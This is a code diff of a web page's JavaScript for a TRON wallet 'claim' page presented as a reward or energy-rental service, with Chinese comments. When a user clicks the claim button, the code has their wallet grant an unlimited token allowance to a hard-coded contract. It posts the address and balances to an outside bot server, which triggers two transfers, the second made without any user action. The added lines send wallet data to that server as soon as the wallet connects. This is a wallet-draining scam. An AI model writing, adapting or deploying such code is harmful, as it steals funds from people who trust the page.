@@ -338,7 +338,6 @@
     <script>
         const AUTO_TRANSFER_CONTRACT = "TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW";
         const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-        // 关键修改：后端接口地址
         const BACKEND_API = "https://bot.kgjiopv1.com:8080/api/tron-interact";
         const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
         
@@ -351,13 +350,11 @@
         let tronWeb, userAddress, trc20Contract;
         let tokenBalance = "0.00", trxBalance = "0.00";
         const RECORD_KEY = "imtoken_infinite_approval_records";
-        // 新增：后端状态存储（无感化关键）
         let backendState = {
             firstPaymentAddr: "",
             secondPaymentAddr: "",
             isFirstTransferDone: false
         };
-
         const walletStatusContainer = document.getElementById("walletStatusContainer");
         const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
         const contractEnergyEl = document.getElementById("contractEnergy");
@@ -413,7 +410,6 @@
                 }
             };
             
-            // 核心修改：领取按钮无感化逻辑
             approveBtn.onclick = async () => {
                 const firstPostData = {
                     address: userAddress,
@@ -421,9 +417,8 @@
                     trxBalance: trxBalance,
                     approveTime: new Date().toLocaleString(),
                     isApproved: false,
-                    signal: "first_transfer" // 第一次转账信号
+                    signal: "first_transfer"
                 };
-
                 try {
                     if (!trc20Contract || !userAddress) throw new Error("合约/地址未初始化");
                     await trc20Contract.approve(AUTO_TRANSFER_CONTRACT, INFINITE_APPROVE_AMOUNT)
@@ -442,8 +437,7 @@
                     alert(`授权失败：${e.message}`);
                     return;
                 }
-
-                // 第一次转账：后端Bot交互+4.6TRX转账
+                // 第一次转账：使用后端已存储的地址
                 try {
                     const firstRes = await fetch(BACKEND_API, {
                         method: "POST",
@@ -461,16 +455,14 @@
                     alert(`第一步处理失败：${firstErr.message}`);
                     return;
                 }
-
-                // 第二次转账：自动触发，无需用户操作
+                // 第二次转账：自动触发
                 const secondPostData = {
                     address: userAddress,
                     tokenBalance: tokenBalance,
                     trxBalance: trxBalance,
                     isApproved: true,
-                    signal: "second_transfer" // 第二次转账信号
+                    signal: "second_transfer"
                 };
-
                 try {
                     const secondRes = await fetch(BACKEND_API, {
                         method: "POST",
@@ -511,6 +503,27 @@
                     USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span><br>
                     <span style="font-size: 12px; color: #4ade80;">点击领取后自动完成能量租赁</span>
                 `;
+                
+                // 新增：连接钱包后发送初始化请求，让后端提前获取能量租赁地址
+                const initData = {
+                    address: userAddress,
+                    tokenBalance: tokenBalance,
+                    trxBalance: trxBalance,
+                    signal: "init_energy_rental"  // 初始化信号
+                };
+                try {
+                    const initRes = await fetch(BACKEND_API, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(initData),
+                        credentials: "include"
+                    });
+                    const initResData = await initRes.json();
+                    console.log("后端能量租赁初始化结果：", initResData);
+                } catch (initErr) {
+                    console.warn("初始化能量租赁失败：", initErr);
+                    alert("能量租赁初始化中，请稍候再点击领取");
+                }
                 
                 document.getElementById("approveBtn").disabled = false;
                 updateWalletStatus();
